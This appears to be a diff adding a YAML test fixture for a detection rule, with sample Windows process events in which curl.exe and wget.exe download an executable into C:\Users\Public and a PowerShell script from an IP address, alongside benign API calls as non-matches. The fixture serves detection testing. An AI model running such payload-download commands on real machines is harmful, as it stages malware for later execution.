@@ -1,0 +1,37 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: curl.exe, executable: 'C:\Windows\System32\curl.exe', command_line: 'curl.exe -o C:\Users\Public\a.exe
+        http://203.0.113.9/a.exe'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: wget.exe, executable: 'C:\Windows\System32\wget.exe', command_line: 'wget https://203.0.113.9/p.ps1
+        -O p.ps1'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: curl.exe, executable: 'C:\Windows\System32\curl.exe', command_line: 'curl https://api.github.com/user'}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: curl.exe, executable: 'C:\Windows\System32\curl.exe', command_line: 'curl -o out.json https://api.x.com/v1'}
